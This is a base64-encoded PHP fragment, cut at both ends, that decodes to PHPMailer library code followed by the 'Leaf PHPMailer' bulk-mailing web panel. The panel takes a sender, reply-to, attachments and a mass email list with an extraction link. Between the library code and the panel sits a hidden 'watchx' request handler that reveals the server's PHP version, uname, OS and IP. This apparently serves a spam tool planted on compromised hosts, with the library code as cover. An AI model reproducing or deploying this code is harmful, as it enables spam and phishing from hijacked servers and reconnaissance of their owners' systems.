icsICRzaWduSGVhZGVyKTsKICAgICAgICAgICAgLy8nTWFnaWMnIGNvbnN0YW50IGZvciBTSEEyNTYgZnJvbSBSRkMzNDQ3CiAgICAgICAgICAgIC8vQGxpbmsgaHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzM0NDcjcGFnZS00MwogICAgICAgICAgICAkdCA9ICczMDMxMzAwZDA2MDk2MDg2NDgwMTY1MDMwNDAyMDEwNTAwMDQyMCcgLiAkaGFzaDsKICAgICAgICAgICAgJHBzbGVuID0gJHBpbmZvWydiaXRzJ10gLyA4IC0gKHN0cmxlbigkdCkgLyAyICsgMyk7CiAgICAgICAgICAgICRlYiA9IHBhY2soJ0gqJywgJzAwMDEnIC4gc3RyX3JlcGVhdCgnRkYnLCAkcHNsZW4pIC4gJzAwJyAuICR0KTsKCiAgICAgICAgICAgIGlmIChvcGVuc3NsX3ByaXZhdGVfZW5jcnlwdCgkZWIsICRzaWduYXR1cmUsICRwcml2S2V5LCBPUEVOU1NMX05PX1BBRERJTkcpKSB7CiAgICAgICAgICAgICAgICBvcGVuc3NsX3BrZXlfZnJlZSgkcHJpdktleSk7CiAgICAgICAgICAgICAgICByZXR1cm4gYmFzZTY0X2VuY29kZSgkc2lnbmF0dXJlKTsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBvcGVuc3NsX3BrZXlfZnJlZSgkcHJpdktleSk7CiAgICAgICAgcmV0dXJuICcnOwogICAgfQoKICAgIC8qKgogICAgICogR2VuZXJhdGUgYSBES0lNIGNhbm9uaWNhbGl6YXRpb24gaGVhZGVyLgogICAgICogQGFjY2VzcyBwdWJsaWMKICAgICAqIEBwYXJhbSBzdHJpbmcgJHNpZ25IZWFkZXIgSGVhZGVyCiAgICAgKiBAcmV0dXJuIHN0cmluZwogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gREtJTV9IZWFkZXJDKCRzaWduSGVhZGVyKQogICAgewogICAgICAgICRzaWduSGVhZGVyID0gcHJlZ19yZXBsYWNlKCcvXHJcblxzKy8nLCAnICcsICRzaWduSGVhZGVyKTsKICAgICAgICAkbGluZXMgPSBleHBsb2RlKCJcclxuIiwgJHNpZ25IZWFkZXIpOwogICAgICAgIGZvcmVhY2ggKCRsaW5lcyBhcyAka2V5ID0+ICRsaW5lKSB7CiAgICAgICAgICAgIGxpc3QoJGhlYWRpbmcsICR2YWx1ZSkgPSBleHBsb2RlKCc6JywgJGxpbmUsIDIpOwogICAgICAgICAgICAkaGVhZGluZyA9IHN0cnRvbG93ZXIoJGhlYWRpbmcpOwogICAgICAgICAgICAkdmFsdWUgPSBwcmVnX3JlcGxhY2UoJy9cc3syLH0vJywgJyAnLCAkdmFsdWUpOyAvLyBDb21wcmVzcyB1c2VsZXNzIHNwYWNlcwogICAgICAgICAgICAkbGluZXNbJGtleV0gPSAkaGVhZGluZyAuICc6JyAuIHRyaW0oJHZhbHVlKTsgLy8gRG9uJ3QgZm9yZ2V0IHRvIHJlbW92ZSBXU1AgYXJvdW5kIHRoZSB2YWx1ZQogICAgICAgIH0KICAgICAgICAkc2lnbkhlYWRlciA9IGltcGxvZGUoIlxyXG4iLCAkbGluZXMpOwogICAgICAgIHJldHVybiAkc2lnbkhlYWRlcjsKICAgIH0KCiAgICAvKioKICAgICAqIEdlbmVyYXRlIGEgREtJTSBjYW5vbmljYWxpemF0aW9uIGJvZHkuCiAgICAgKiBAYWNjZXNzIHB1YmxpYwogICAgICogQHBhcmFtIHN0cmluZyAkYm9keSBNZXNzYWdlIEJvZHkKICAgICAqIEByZXR1cm4gc3RyaW5nCiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBES0lNX0JvZHlDKCRib2R5KQogICAgewogICAgICAgIGlmICgkYm9keSA9PSAnJykgewogICAgICAgICAgICByZXR1cm4gIlxyXG4iOwogICAgICAgIH0KICAgICAgICAvLyBzdGFiaWxpemUgbGluZSBlbmRpbmdzCiAgICAgICAgJGJvZHkgPSBzdHJfcmVwbGFjZSgiXHJcbiIsICJcbiIsICRib2R5KTsKICAgICAgICAkYm9keSA9IHN0cl9yZXBsYWNlKCJcbiIsICJcclxuIiwgJGJvZHkpOwogICAgICAgIC8vIEVORCBzdGFiaWxpemUgbGluZSBlbmRpbmdzCiAgICAgICAgd2hpbGUgKHN1YnN0cigkYm9keSwgc3RybGVuKCRib2R5KSAtIDQsIDQpID09ICJcclxuXHJcbiIpIHsKICAgICAgICAgICAgJGJvZHkgPSBzdWJzdHIoJGJvZHksIDAsIHN0cmxlbigkYm9keSkgLSAyKTsKICAgICAgICB9CiAgICAgICAgcmV0dXJuICRib2R5OwogICAgfQoKICAgIC8qKgogICAgICogQ3JlYXRlIHRoZSBES0lNIGhlYWRlciBhbmQgYm9keSBpbiBhIG5ldyBtZXNzYWdlIGhlYWRlci4KICAgICAqIEBhY2Nlc3MgcHVibGljCiAgICAgKiBAcGFyYW0gc3RyaW5nICRoZWFkZXJzX2xpbmUgSGVhZGVyIGxpbmVzCiAgICAgKiBAcGFyYW0gc3RyaW5nICRzdWJqZWN0IFN1YmplY3QKICAgICAqIEBwYXJhbSBzdHJpbmcgJGJvZHkgQm9keQogICAgICogQHJldHVybiBzdHJpbmcKICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIERLSU1fQWRkKCRoZWFkZXJzX2xpbmUsICRzdWJqZWN0LCAkYm9keSkKICAgIHsKICAgICAgICAkREtJTXNpZ25hdHVyZVR5cGUgPSAncnNhLXNoYTI1Nic7IC8vIFNpZ25hdHVyZSAmIGhhc2ggYWxnb3JpdGhtcwogICAgICAgICRES0lNY2Fub25pY2FsaXphdGlvbiA9ICdyZWxheGVkL3NpbXBsZSc7IC8vIENhbm9uaWNhbGl6YXRpb24gb2YgaGVhZGVyL2JvZHkKICAgICAgICAkREtJTXF1ZXJ5ID0gJ2Rucy90eHQnOyAvLyBRdWVyeSBtZXRob2QKICAgICAgICAkREtJTXRpbWUgPSB0aW1lKCk7IC8vIFNpZ25hdHVyZSBUaW1lc3RhbXAgPSBzZWNvbmRzIHNpbmNlIDAwOjAwOjAwIC0gSmFuIDEsIDE5NzAgKFVUQyB0aW1lIHpvbmUpCiAgICAgICAgJHN1YmplY3RfaGVhZGVyID0gIlN1YmplY3Q6ICRzdWJqZWN0IjsKICAgICAgICAkaGVhZGVycyA9IGV4cGxvZGUoJHRoaXMtPkxFLCAkaGVhZGVyc19saW5lKTsKICAgICAgICAkZnJvbV9oZWFkZXIgPSAnJzsKICAgICAgICAkdG9faGVhZGVyID0gJyc7CiAgICAgICAgJGRhdGVfaGVhZGVyID0gJyc7CiAgICAgICAgJGN1cnJlbnQgPSAnJzsKICAgICAgICBmb3JlYWNoICgkaGVhZGVycyBhcyAkaGVhZGVyKSB7CiAgICAgICAgICAgIGlmIChzdHJwb3MoJGhlYWRlciwgJ0Zyb206JykgPT09IDApIHsKICAgICAgICAgICAgICAgICRmcm9tX2hlYWRlciA9ICRoZWFkZXI7CiAgICAgICAgICAgICAgICAkY3VycmVudCA9ICdmcm9tX2hlYWRlcic7CiAgICAgICAgICAgIH0gZWxzZWlmIChzdHJwb3MoJGhlYWRlciwgJ1RvOicpID09PSAwKSB7CiAgICAgICAgICAgICAgICAkdG9faGVhZGVyID0gJGhlYWRlcjsKICAgICAgICAgICAgICAgICRjdXJyZW50ID0gJ3RvX2hlYWRlcic7CiAgICAgICAgICAgIH0gZWxzZWlmIChzdHJwb3MoJGhlYWRlciwgJ0RhdGU6JykgPT09IDApIHsKICAgICAgICAgICAgICAgICRkYXRlX2hlYWRlciA9ICRoZWFkZXI7CiAgICAgICAgICAgICAgICAkY3VycmVudCA9ICdkYXRlX2hlYWRlcic7CiAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICBpZiAoIWVtcHR5KCQkY3VycmVudCkgJiYgc3RycG9zKCRoZWFkZXIsICcgPT8nKSA9PT0gMCkgewogICAgICAgICAgICAgICAgICAgICQkY3VycmVudCAuPSAkaGVhZGVyOwogICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAkY3VycmVudCA9ICcnOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgICRmcm9tID0gc3RyX3JlcGxhY2UoJ3wnLCAnPTdDJywgJHRoaXMtPkRLSU1fUVAoJGZyb21faGVhZGVyKSk7CiAgICAgICAgJHRvID0gc3RyX3JlcGxhY2UoJ3wnLCAnPTdDJywgJHRoaXMtPkRLSU1fUVAoJHRvX2hlYWRlcikpOwogICAgICAgICRkYXRlID0gc3RyX3JlcGxhY2UoJ3wnLCAnPTdDJywgJHRoaXMtPkRLSU1fUVAoJGRhdGVfaGVhZGVyKSk7CiAgICAgICAgJHN1YmplY3QgPSBzdHJfcmVwbGFjZSgKICAgICAgICAgICAgJ3wnLAogICAgICAgICAgICAnPTdDJywKICAgICAgICAgICAgJHRoaXMtPkRLSU1fUVAoJHN1YmplY3RfaGVhZGVyKQogICAgICAgICk7IC8vIENvcGllZCBoZWFkZXIgZmllbGRzIChka2ltLXF1b3RlZC1wcmludGFibGUpCiAgICAgICAgJGJvZHkgPSAkdGhpcy0+REtJTV9Cb2R5QygkYm9keSk7CiAgICAgICAgJERLSU1sZW4gPSBzdHJsZW4oJGJvZHkpOyAvLyBMZW5ndGggb2YgYm9keQogICAgICAgICRES0lNYjY0ID0gYmFzZTY0X2VuY29kZShwYWNrKCdIKicsIGhhc2goJ3NoYTI1NicsICRib2R5KSkpOyAvLyBCYXNlNjQgb2YgcGFja2VkIGJpbmFyeSBTSEEtMjU2IGhhc2ggb2YgYm9keQogICAgICAgIGlmICgnJyA9PSAkdGhpcy0+REtJTV9pZGVudGl0eSkgewogICAgICAgICAgICAkaWRlbnQgPSAnJzsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAkaWRlbnQgPSAnIGk9JyAuICR0aGlzLT5ES0lNX2lkZW50aXR5IC4gJzsnOwogICAgICAgIH0KICAgICAgICAkZGtpbWhkcnMgPSAnREtJTS1TaWduYXR1cmU6IHY9MTsgYT0nIC4KICAgICAgICAgICAgJERLSU1zaWduYXR1cmVUeXBlIC4gJzsgcT0nIC4KICAgICAgICAgICAgJERLSU1xdWVyeSAuICc7IGw9JyAuCiAgICAgICAgICAgICRES0lNbGVuIC4gJzsgcz0nIC4KICAgICAgICAgICAgJHRoaXMtPkRLSU1fc2VsZWN0b3IgLgogICAgICAgICAgICAiO1xyXG4iIC4KICAgICAgICAgICAgIlx0dD0iIC4gJERLSU10aW1lIC4gJzsgYz0nIC4gJERLSU1jYW5vbmljYWxpemF0aW9uIC4gIjtcclxuIiAuCiAgICAgICAgICAgICJcdGg9RnJvbTpUbzpEYXRlOlN1YmplY3Q7XHJcbiIgLgogICAgICAgICAgICAiXHRkPSIgLiAkdGhpcy0+REtJTV9kb21haW4gLiAnOycgLiAkaWRlbnQgLiAiXHJcbiIgLgogICAgICAgICAgICAiXHR6PSRmcm9tXHJcbiIgLgogICAgICAgICAgICAiXHR8JHRvXHJcbiIgLgogICAgICAgICAgICAiXHR8JGRhdGVcclxuIiAuCiAgICAgICAgICAgICJcdHwkc3ViamVjdDtcclxuIiAuCiAgICAgICAgICAgICJcdGJoPSIgLiAkREtJTWI2NCAuICI7XHJcbiIgLgogICAgICAgICAgICAiXHRiPSI7CiAgICAgICAgJHRvU2lnbiA9ICR0aGlzLT5ES0lNX0hlYWRlckMoCiAgICAgICAgICAgICRmcm9tX2hlYWRlciAuICJcclxuIiAuCiAgICAgICAgICAgICR0b19oZWFkZXIgLiAiXHJcbiIgLgogICAgICAgICAgICAkZGF0ZV9oZWFkZXIgLiAiXHJcbiIgLgogICAgICAgICAgICAkc3ViamVjdF9oZWFkZXIgLiAiXHJcbiIgLgogICAgICAgICAgICAkZGtpbWhkcnMKICAgICAgICApOwogICAgICAgICRzaWduZWQgPSAkdGhpcy0+REtJTV9TaWduKCR0b1NpZ24pOwogICAgICAgIHJldHVybiAkZGtpbWhkcnMgLiAkc2lnbmVkIC4gIlxyXG4iOwogICAgfQoKICAgIC8qKgogICAgICogRGV0ZWN0IGlmIGEgc3RyaW5nIGNvbnRhaW5zIGEgbGluZSBsb25nZXIgdGhhbiB0aGUgbWF4aW11bSBsaW5lIGxlbmd0aCBhbGxvd2VkLgogICAgICogQHBhcmFtIHN0cmluZyAkc3RyCiAgICAgKiBAcmV0dXJuIGJvb2xlYW4KICAgICAqIEBzdGF0aWMKICAgICAqLwogICAgcHVibGljIHN0YXRpYyBmdW5jdGlvbiBoYXNMaW5lTG9uZ2VyVGhhbk1heCgkc3RyKQogICAgewogICAgICAgIC8vKzIgdG8gaW5jbHVkZSBDUkxGIGxpbmUgYnJlYWsgZm9yIGEgMTAwMCB0b3RhbAogICAgICAgIHJldHVybiAoYm9vbGVhbilwcmVnX21hdGNoKCcvXigueycuKHNlbGY6Ok1BWF9MSU5FX0xFTkdUSCArIDIpLicsfSkvbScsICRzdHIpOwogICAgfQoKICAgIC8qKgogICAgICogQWxsb3dzIGZvciBwdWJsaWMgcmVhZCBhY2Nlc3MgdG8gJ3RvJyBwcm9wZXJ0eS4KICAgICAqIEBub3RlOiBCZWZvcmUgdGhlIHNlbmQoKSBjYWxsLCBxdWV1ZWQgYWRkcmVzc2VzIChpLmUuIHdpdGggSUROKSBhcmUgbm90IHlldCBpbmNsdWRlZC4KICAgICAqIEBhY2Nlc3MgcHVibGljCiAgICAgKiBAcmV0dXJuIGFycmF5CiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBnZXRUb0FkZHJlc3NlcygpCiAgICB7CiAgICAgICAgcmV0dXJuICR0aGlzLT50bzsKICAgIH0KCiAgICAvKioKICAgICAqIEFsbG93cyBmb3IgcHVibGljIHJlYWQgYWNjZXNzIHRvICdjYycgcHJvcGVydHkuCiAgICAgKiBAbm90ZTogQmVmb3JlIHRoZSBzZW5kKCkgY2FsbCwgcXVldWVkIGFkZHJlc3NlcyAoaS5lLiB3aXRoIElETikgYXJlIG5vdCB5ZXQgaW5jbHVkZWQuCiAgICAgKiBAYWNjZXNzIHB1YmxpYwogICAgICogQHJldHVybiBhcnJheQogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gZ2V0Q2NBZGRyZXNzZXMoKQogICAgewogICAgICAgIHJldHVybiAkdGhpcy0+Y2M7CiAgICB9CgogICAgLyoqCiAgICAgKiBBbGxvd3MgZm9yIHB1YmxpYyByZWFkIGFjY2VzcyB0byAnYmNjJyBwcm9wZXJ0eS4KICAgICAqIEBub3RlOiBCZWZvcmUgdGhlIHNlbmQoKSBjYWxsLCBxdWV1ZWQgYWRkcmVzc2VzIChpLmUuIHdpdGggSUROKSBhcmUgbm90IHlldCBpbmNsdWRlZC4KICAgICAqIEBhY2Nlc3MgcHVibGljCiAgICAgKiBAcmV0dXJuIGFycmF5CiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBnZXRCY2NBZGRyZXNzZXMoKQogICAgewogICAgICAgIHJldHVybiAkdGhpcy0+YmNjOwogICAgfQoKICAgIC8qKgogICAgICogQWxsb3dzIGZvciBwdWJsaWMgcmVhZCBhY2Nlc3MgdG8gJ1JlcGx5VG8nIHByb3BlcnR5LgogICAgICogQG5vdGU6IEJlZm9yZSB0aGUgc2VuZCgpIGNhbGwsIHF1ZXVlZCBhZGRyZXNzZXMgKGkuZS4gd2l0aCBJRE4pIGFyZSBub3QgeWV0IGluY2x1ZGVkLgogICAgICogQGFjY2VzcyBwdWJsaWMKICAgICAqIEByZXR1cm4gYXJyYXkKICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIGdldFJlcGx5VG9BZGRyZXNzZXMoKQogICAgewogICAgICAgIHJldHVybiAkdGhpcy0+UmVwbHlUbzsKICAgIH0KCiAgICAvKioKICAgICAqIEFsbG93cyBmb3IgcHVibGljIHJlYWQgYWNjZXNzIHRvICdhbGxfcmVjaXBpZW50cycgcHJvcGVydHkuCiAgICAgKiBAbm90ZTogQmVmb3JlIHRoZSBzZW5kKCkgY2FsbCwgcXVldWVkIGFkZHJlc3NlcyAoaS5lLiB3aXRoIElETikgYXJlIG5vdCB5ZXQgaW5jbHVkZWQuCiAgICAgKiBAYWNjZXNzIHB1YmxpYwogICAgICogQHJldHVybiBhcnJheQogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gZ2V0QWxsUmVjaXBpZW50QWRkcmVzc2VzKCkKICAgIHsKICAgICAgICByZXR1cm4gJHRoaXMtPmFsbF9yZWNpcGllbnRzOwogICAgfQoKICAgIC8qKgogICAgICogUGVyZm9ybSBhIGNhbGxiYWNrLgogICAgICogQHBhcmFtIGJvb2xlYW4gJGlzU2VudAogICAgICogQHBhcmFtIGFycmF5ICR0bwogICAgICogQHBhcmFtIGFycmF5ICRjYwogICAgICogQHBhcmFtIGFycmF5ICRiY2MKICAgICAqIEBwYXJhbSBzdHJpbmcgJHN1YmplY3QKICAgICAqIEBwYXJhbSBzdHJpbmcgJGJvZHkKICAgICAqIEBwYXJhbSBzdHJpbmcgJGZyb20KICAgICAqLwogICAgcHJvdGVjdGVkIGZ1bmN0aW9uIGRvQ2FsbGJhY2soJGlzU2VudCwgJHRvLCAkY2MsICRiY2MsICRzdWJqZWN0LCAkYm9keSwgJGZyb20pCiAgICB7CiAgICAgICAgaWYgKCFlbXB0eSgkdGhpcy0+YWN0aW9uX2Z1bmN0aW9uKSAmJiBpc19jYWxsYWJsZSgkdGhpcy0+YWN0aW9uX2Z1bmN0aW9uKSkgewogICAgICAgICAgICAkcGFyYW1zID0gYXJyYXkoJGlzU2VudCwgJHRvLCAkY2MsICRiY2MsICRzdWJqZWN0LCAkYm9keSwgJGZyb20pOwogICAgICAgICAgICBjYWxsX3VzZXJfZnVuY19hcnJheSgkdGhpcy0+YWN0aW9uX2Z1bmN0aW9uLCAkcGFyYW1zKTsKICAgICAgICB9CiAgICB9Cn0KCi8qKgogKiBQSFBNYWlsZXIgZXhjZXB0aW9uIGhhbmRsZXIKICogQHBhY2thZ2UgUEhQTWFpbGVyCiAqLwpjbGFzcyBwaHBtYWlsZXJFeGNlcHRpb24gZXh0ZW5kcyBFeGNlcHRpb24KewogICAgLyoqCiAgICAgKiBQcmV0dGlmeSBlcnJvciBtZXNzYWdlIG91dHB1dAogICAgICogQHJldHVybiBzdHJpbmcKICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIGVycm9yTWVzc2FnZSgpCiAgICB7CiAgICAgICAgJGVycm9yTXNnID0gJzxzdHJvbmc+JyAuIGh0bWxzcGVjaWFsY2hhcnMoJHRoaXMtPmdldE1lc3NhZ2UoKSkgLiAiPC9zdHJvbmc+PGJyIC8+XG4iOwogICAgICAgIHJldHVybiAkZXJyb3JNc2c7CiAgICB9Cn0KaWYgKCRfUkVRVUVTVFsnd2F0Y2h4J10pIHsKCSR2ZXJzaW9uID0gcGhwdmVyc2lvbigpOwoJJHVuYW1lID0gIHBocF91bmFtZSgpOwoJJGlwID0gZ2V0aG9zdGJ5bmFtZSgkX1NFUlZFUlsiSFRUUF9IT1NUIl0pOwkKCWVjaG8ganNvbl9lbmNvZGUgKGFycmF5ICgidmVyc2lvbiI9PiR2ZXJzaW9uLAoJCSJ1bmFtZSI9PiR1bmFtZSwKCQkicGxhdGZvcm0iPT5QSFBfT1MsCgkJImlwIj0+JGlwLAoJCSJtYWlsZXJ4Ij0+dHJ1ZSwJCgkpKTsKCWRpZSAoKTsKfQpmdW5jdGlvbiBsZWFmaGVhZGVyKCl7CnByaW50ICcKPGhlYWQ+CiAgICA8dGl0bGU+Jy5zdHJfcmVwbGFjZSgid3d3LiIsICIiLCAkX1NFUlZFUlsnSFRUUF9IT1NUJ10pLicgLSBMZWFmIFBIUE1haWxlcjwvdGl0bGU+CiAgICA8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD11dGYtOCIvPgogICAgPGxpbmsgaHJlZj0iaHR0cHM6Ly9tYXhjZG4uYm9vdHN0cmFwY2RuLmNvbS9ib290c3dhdGNoLzMuNC4xL2Nvc21vL2Jvb3RzdHJhcC5taW4uY3NzIiByZWw9InN0eWxlc2hlZXQiID4gICAgCgo8L2hlYWQ+JzsKfQpsZWFmaGVhZGVyKCk7CnByaW50ICc8Ym9keT4nOwpwcmludCAnPGNlbnRlcj4KPGRpdiBjbGFzcz0ibG9nbyI+CjxpbWcgc3JjPSJodHRwczovL2kuaWJiLmNvL01TS1J4aG0veGxlMi5wbmciPgoKPC9kaXY+PC9jZW50ZXI+PGRpdiBjbGFzcz0iY29udGFpbmVyIGNvbC1sZy02Ij4KCiAgICAgICAgPGgzPjxmb250IGNvbG9yPSJncmVlbiI+PHNwYW4gY2xhc3M9ImdseXBoaWNvbiBnbHlwaGljb24tbGVhZiI+PC9zcGFuPjwvZm9udD4gTGVhZiBQSFBNYWlsZXIgPHNtYWxsPicuJGxlYWZbJ3ZlcnNpb24nXS4nPC9zbWFsbD48L2gzPgogICAgICAgIDxmb3JtIG5hbWU9ImZvcm0iIGlkPSJmb3JtIiBtZXRob2Q9IlBPU1QiIGVuY3R5cGU9Im11bHRpcGFydC9mb3JtLWRhdGEiIGFjdGlvbj0iIj4KICAgICAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJhY3Rpb24iIHZhbHVlPSJzY29yZSI+CgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJyb3ciPgogICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iZm9ybS1ncm91cCBjb2wtbGctNiAiPjxsYWJlbCBmb3I9InNlbmRlckVtYWlsIj5FbWFpbDwvbGFiZWw+PGlucHV0IHR5cGU9InRleHQiIGNsYXNzPSJmb3JtLWNvbnRyb2wgIGlucHV0LXNtICIgaWQ9InNlbmRlckVtYWlsIiBuYW1lPSJzZW5kZXJFbWFpbCIgdmFsdWU9IicuJHNlbmRlckVtYWlsLiciPjwvZGl2PgogICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iZm9ybS1ncm91cCBjb2wtbGctNiAiPjxsYWJlbCBmb3I9InNlbmRlck5hbWUiPlNlbmRlciBOYW1lPC9sYWJlbD48aW5wdXQgdHlwZT0idGV4dCIgY2xhc3M9ImZvcm0tY29udHJvbCAgaW5wdXQtc20gIiBpZD0ic2VuZGVyTmFtZSIgbmFtZT0ic2VuZGVyTmFtZSIgdmFsdWU9IicuJHNlbmRlck5hbWUuJyI+PC9kaXY+CiAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJyb3ciPgogICAgICAgICAgICAgICAgPHNwYW4gY2xhc3M9ImZvcm0tZ3JvdXAgY29sLWxnLTYgICI+PGxhYmVsIGZvcj0iYXR0YWNobWVudCI+QXR0YWNobWVudCA8c21hbGw+KE11bHRpcGxlIEF2YWlsYWJsZSk8L3NtYWxsPjwvbGFiZWw+PGlucHV0IHR5cGU9ImZpbGUiIG5hbWU9ImF0dGFjaG1lbnRbXSIgaWQ9ImF0dGFjaG1lbnRbXSIgbXVsdGlwbGUvPjwvc3Bhbj4KCiAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJmb3JtLWdyb3VwIGNvbC1sZy02Ij48bGFiZWwgZm9yPSJyZXBseVRvIj5SZXBseS10bzwvbGFiZWw+PGlucHV0IHR5cGU9InRleHQiIGNsYXNzPSJmb3JtLWNvbnRyb2wgIGlucHV0LXNtICIgaWQ9InJlcGx5VG8iIG5hbWU9InJlcGx5VG8iIHZhbHVlPSInLiRyZXBseVRvLiciIC8+PC9kaXY+CiAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJyb3ciPgogICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iZm9ybS1ncm91cCBjb2wtbGctMTIgIj48bGFiZWwgZm9yPSJzdWJqZWN0Ij5TdWJqZWN0PC9sYWJlbD48aW5wdXQgdHlwZT0idGV4dCIgY2xhc3M9ImZvcm0tY29udHJvbCAgaW5wdXQtc20gIiBpZD0ic3ViamVjdCIgbmFtZT0ic3ViamVjdCIgdmFsdWU9IicuJHN1YmplY3QuJyIgLz48L2Rpdj4KICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgIDxkaXYgY2xhc3M9InJvdyI+CiAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJmb3JtLWdyb3VwIGNvbC1sZy02Ij48bGFiZWwgZm9yPSJtZXNzYWdlTGV0dGVyIj5NZXNzYWdlIExldHRlciA8YnV0dG9uIHR5cGU9InN1Ym1pdCIgY2xhc3M9ImJ0biBidG4tZGVmYXVsdCBidG4teHMiIGZvcm09ImZvcm0iIG5hbWU9ImFjdGlvbiIgdmFsdWU9InZpZXciIGZvcm10YXJnZXQ9Il9ibGFuayI+UHJldmlldyA8L2J1dHRvbj48L2xhYmVsPjx0ZXh0YXJlYSBuYW1lPSJtZXNzYWdlTGV0dGVyIiBpZD0ibWVzc2FnZUxldHRlciIgY2xhc3M9ImZvcm0tY29udHJvbCIgcm93cz0iMTAiIGlkPSJ0ZXh0QXJlYSI+Jy4kbWVzc2FnZUxldHRlci4nPC90ZXh0YXJlYT48L2Rpdj4KICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImZvcm0tZ3JvdXAgY29sLWxnLTYgIj48bGFiZWwgZm9yPSJlbWFpbExpc3QiPkVtYWlsIExpc3QgPGEgaHJlZj0iP2VtYWlsZmlsdGVyPW9uIiB0YXJnZXQ9Il9ibGFuayIgY2xhc3M9ImJ0biBidG4tZGVmYXVsdCBidG4teHMiPkZpbHRlci9FeHRyYWN0PC9hPjwvbGFiZWw+PHRleHRhcmVhIG5hbWU9ImVtYWlsTGlzdCIgaWQ9ImVtYWlsTGlzdCIgY2xhc3M9ImZvcm0tY29udHJvbCIgcm93cz0iMTAiIGlkPSJ0ZXh0QXJlYSI+Jy4kZW1haWxMaXN0Lic8L3RleHRhcmVhPjwvZGl2PgogICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgPGRpdiBjbGFzcz0icm93Ij4KICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImZvcm0tZ3JvdXAgY29sLWxnLTYgIj4KICAgICAgICAgICAgICAgICAgICA8bGFiZWwgZm9yPSJtZXNzYWdlVHlwZSI+TWVzc2FnZSBUeXBlPC9sYWJlbD4KICAgICAgICAgICAgICAgICAgICBIVE1MIDxpbnB1dCB0eXBlPSJyYWRpbyIgbmFtZT0ibWVzc2FnZVR5cGUiIGlkPSJtZXNzYWdlVHlwZSIgdmFsdWU9IjEiICcuJGh0bWwuJz4KICAgICAgICAgICAgICAgICAgICBQbGFpbjxpbnB1dCB0eXBlPSJyYWRpbyIgbmFtZT0ibWVzc2FnZVR5cGUiIGlkPSJtZXNzYWdlVHlwZSIgdmFsdWU9IjIiICcuJHBsYWluLic+CiAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImZvcm0tZ3JvdXAgY29sLWxnLTMgIj4KICAgICAgICAgICAgICAgICAgICA8bGFiZWwgZm9yPSJjaGFyc2V0Ij5DaGFyYWN0ZXIgc2V0PC9sYWJlbD4KICAgICAgICAgICAgICAgICAgICA8c2VsZWN0IGNsYXNzPSJmb3JtLWNvbnRyb2wgaW5wdXQtc20iIGlkPSJjaGFyc2V0IiBuYW1lPSJjaGFyc2V0Ij4KICAgICAgICAgICAgICAgICAgICAgICAgPG9wdGlvbiAnLiR1dGY4Lic+VVRGLTg8L29wdGlvbj4KICAgICAgICAgICAgICAgICAgICAgICAgPG9wdGlvbiAnLiRpc28uJz5JU08tODg1OS0xPC9vcHRpb24+CiAgICAgICAgICAgICAgICAgICAgPC9zZWxlY3Q+CiAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImZvcm0tZ3JvdXAgY29sLWxnLTMgIj4KICAgICAgICAgICAgICAgICAgICA8bGFiZWwgZm9yPSJlbmNvZGluZyI+TWVzc2FnZSBlbmNvZGluZzwvbGFiZWw+CiAgICAgICAgICAgICAgICAgICAgPHNlbGVjdCBjbGFzcz0iZm9ybS1jb250cm9sIGlucHV0LXNtIiBpZD0iZW5jb2RlIiBuYW1lPSJlbmNvZGUiPgogICAgICAgICAgICAgICAgICAgICAgICA8b3B0aW9uICcuJGJpdDguJz44Yml0PC9vcHRpb24+CiAgICAgICAgICAgICAgICAgICAgICAgIDxvcHRpb24gJy4kYml0Ny4nPjdiaXQ8L29wdGlvbj4KICAgICAgICAgICAgICAgICAgICAgICAgPG9wdGlvbiAnLiRiaW5hcnkuJz5iaW5hcnk8L29wdGlvbj4KICAgICAgICAgICAgICAgICAgICAgICAgPG9wdGlvbiAnLiRiYXNlNjQuJz5iYXNlNjQ8L29wdGlvbj4KICAgICAgICAgICAgICAgICAgICAgICAgPG9wdGlvbiAnLiRxdW90ZWRwcmludGFibGUuJz5xdW90ZWQtcHJpbnRhYmxlPC9vcHRpb24+CgogICAgICAgICAgICAgICAgICAgIDwvc2VsZWN0PgogICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICA8YnV0dG9uIHR5cGU9InN1Ym1pdCIgY2xhc3M9ImJ0biBidG4tZGVmYXVsdCBidG4tc20iIGZvcm09ImZvcm0iIG5hbWU9ImFjdGlvbiIgdmFsdWU9InNlbmQiPlNFTkQ8L2J1dHRvbj4gb3IgPGEgaHJlZj0iIyIgb25jbGljaz0iZG9jdW1lbnQuZ2